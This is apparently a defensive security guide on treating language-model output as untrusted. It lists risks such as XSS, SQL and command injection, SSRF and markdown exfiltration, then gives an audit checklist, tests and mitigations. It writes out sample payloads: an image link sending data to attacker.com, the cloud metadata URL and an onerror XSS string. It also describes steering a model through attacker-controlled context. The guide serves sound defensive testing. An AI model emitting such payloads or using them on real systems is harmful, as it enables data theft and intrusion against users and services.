# Output Handling

How model output is consumed downstream determines what the model can be used to attack. The model's output is untrusted data — the same scrutiny you apply to user input applies here.

## Risk patterns

- **Stored XSS via model output:** model emits `<script>` or HTML, app renders it as innerHTML or via `dangerouslySetInnerHTML`. User who viewed the page is now executing attacker code (where the attacker is whoever influenced the model's output).
- **SQL injection via model:** model generates SQL based on user request; query is executed without parameterization.
- **Command injection:** model output is passed to `eval`, `exec`, `os.system`, or shell.
- **SSRF via model:** model generates URLs; backend fetches them without validation. Attacker prompts model to emit `http://169.254.169.254/...` or `http://internal-admin/`.
- **Open redirect:** model emits links, app blindly redirects.
- **Markdown link injection:** model output rendered as markdown; attacker-controlled context causes `[click here](javascript:...)` or data-exfil URLs in image tags `![](https://attacker.com/?data=...)`.
- **Email/SMS injection:** model output sent verbatim to email or SMS; can include forged headers or be used for spam.

## Audit checklist

- Is model output rendered as text, or as HTML/markdown? If the latter, what sanitization?
- For markdown rendering: are autolinks restricted? Image sources validated? `javascript:` blocked?
- Does any model output ever get passed to `eval`, `exec`, dynamic SQL, or shell? Stop. Use parameterization or sandboxed execution.
- Does the application fetch URLs the model emits? Apply SSRF protections (block private IPs, link-local, metadata endpoints, file://).
- Are downstream sinks (databases, email, SMS) given sanitized data?
- Is there a length cap on model output? Unlimited output enables DoS and exfiltration.

## Specific tests

- Prompt model to emit `<img src=x onerror=alert(1)>`. Render the response. Did it execute?
- Prompt model to emit a markdown image with attacker-controlled URL. Did the browser load the image (and leak referrer / cookies)?
- Prompt model to emit a SQL query that drops a table, in a context where queries get executed.
- Prompt model to emit a URL pointing to `http://169.254.169.254/latest/meta-data/`. Does the backend fetch it?

## Mitigations

- Treat model output as untrusted. Encode for the rendering context (HTML escape, SQL parameterize, shell quote).
- Sandbox any code execution to a separate process with no network and no filesystem access.
- For markdown: use a strict renderer with allowlisted protocols and tags.
- For agent systems: gate side-effecting actions behind explicit confirmation, not behind model judgment.
